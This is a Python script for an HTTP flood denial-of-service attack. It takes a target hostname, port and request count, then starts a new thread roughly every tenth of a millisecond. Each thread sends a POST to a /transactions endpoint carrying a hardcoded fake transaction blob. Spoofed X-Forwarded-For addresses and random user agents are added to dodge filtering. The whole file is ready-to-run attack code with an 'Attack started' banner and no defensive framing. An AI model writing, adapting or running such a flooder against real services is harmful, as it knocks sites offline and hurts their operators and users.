# -*- coding: utf-8 -*-

import random
import socket
import sys
import threading
import time
from fake_useragent import UserAgent
import ipaddress
import ssl

sys.path.append('/root/flooding/flood_env/lib/python3.11/site-packages')

ua = UserAgent()
ip_pool = [str(ip) for ip in ipaddress.IPv4Network('192.168.0.0/16')]

# Hardcoded transaction XDR (replace with valid one)
FAKE_XDR = "AAAAAgAAAABBn6Y2jvPR3T8IAAAAAAAAAAAPQkAAAAAAAAAAAEURVNUAAAAACvSG6PHV0ADukYAAAAACgAAAAAAAAABAAAAAAAAAAEAAAAAIJJw3JtNkqsQN8E0+8oKqj0lQxQ6Xw65u5VZkQ+oAAAAAAAAAAAAAAABAAAAAAAAAABAAAAACCSjA1J2tq4DmIBXh9wj3q4mB0+epQqVl7Hh6F0kIAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAA"

# Global flag for response display
response_printed = False

# Parse inputs
host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print(f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
    sys.exit(1)

# Convert FQDN to IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print(" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

# Shared variables
thread_num = 0
thread_num_mutex = threading.Lock()

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()

def attack():
    global response_printed
    print_status()
    data = f"tx={FAKE_XDR}"
    
    headers = [
        f"X-Forwarded-For: {random.choice(ip_pool)}",
        f"User-Agent: {ua.random}",
        "Accept-Language: en-US,en;q=0.9",
        "Connection: keep-alive",
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {len(data)}"
    ]

    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        dos.connect((ip, port))
        request = (
            f"POST /transactions HTTP/1.1\r\n" +
            f"Host: {host}\r\n" +
            "\r\n".join(headers) +
            "\r\n\r\n" +
            data
        ).encode()
        dos.send(request)
        
        # Attempt to read response once
        try:
            response = dos.recv(4096)  # Increased buffer size
            with thread_num_mutex:
                if not response_printed:
                    status_line = response
                    headers_part = response.decode()
                    print("\n\n[First Server Response]")
                    print(f"Status Code: {status_line}")
                    print(f"Headers:\n{headers_part}")
                    response_printed = True
        except Exception as e:
            pass
            
    except socket.error as e:
        print(f"\n[Connection error]: {str(e)}")
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

print(f"[#] Attack started on {host} ({ip}) || Port: {port} || # Requests: {num_requests}")

# Thread management
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)
    time.sleep(0.0001)

for current_thread in all_threads:
    current_thread.join()
